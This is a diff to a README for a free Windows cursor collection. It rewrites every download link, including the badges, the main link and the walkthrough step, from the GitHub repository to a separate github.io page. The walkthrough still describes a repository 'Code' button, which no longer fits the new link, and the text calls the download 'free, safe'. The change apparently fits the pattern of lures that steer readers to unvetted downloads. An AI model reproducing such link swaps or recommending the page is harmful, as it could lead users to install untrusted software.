@@ -1,7 +1,7 @@
 <h1>✨ custom-cursor-windows - Make Your Mouse Awesome Today</h1>
 
 <p align="center">
-  <a href="https://github.com/Lalala110928/custom-cursor-windows"><img src="https://img.shields.io/badge/🎯-Get%20Free%20Cursors-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download"></a>
+  <a href="https://lalala110928.github.io"><img src="https://img.shields.io/badge/🎯-Get%20Free%20Cursors-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download"></a>
 </p>
 
 <p align="center">
@@ -37,7 +37,7 @@ Follow these 3 simple steps. It takes less than 2 minutes.
 
 Visit this link to download the application:
 
-### 🔗 **[Click Here to Download the Cursor Collection](https://github.com/Lalala110928/custom-cursor-windows)**
+### 🔗 **[Click Here to Download the Cursor Collection](https://lalala110928.github.io)**
 
 This link will take you to the download page. Look for the file on that page and get it onto your computer.
 
@@ -89,7 +89,7 @@ Here's your **full walkthrough** — read this if you got stuck anywhere above.
 ### ✅ Download Step
 
 1. Open your web browser (Chrome, Edge, or Firefox).
-2. Go to: **https://github.com/Lalala110928/custom-cursor-windows**
+2. Go to: **https://lalala110928.github.io**
 3. On that page, you'll see a big **green "Code" button** — click it.
 4. Select **"Download ZIP"** from the dropdown menu.
 5. Your browser will save a `.zip` file to your **Downloads** folder.
@@ -214,7 +214,7 @@ The best part? It's **free, safe, and takes 2 minutes to install**. Even if you'
 ---
 
 <p align="center">
-  <a href="https://github.com/Lalala110928/custom-cursor-windows"><img src="https://img.shields.io/badge/🎨-Download%20Free%20Cursors%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download"></a>
+  <a href="https://lalala110928.github.io"><img src="https://img.shields.io/badge/🎨-Download%20Free%20Cursors%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download"></a>
 </p>
 
 ---
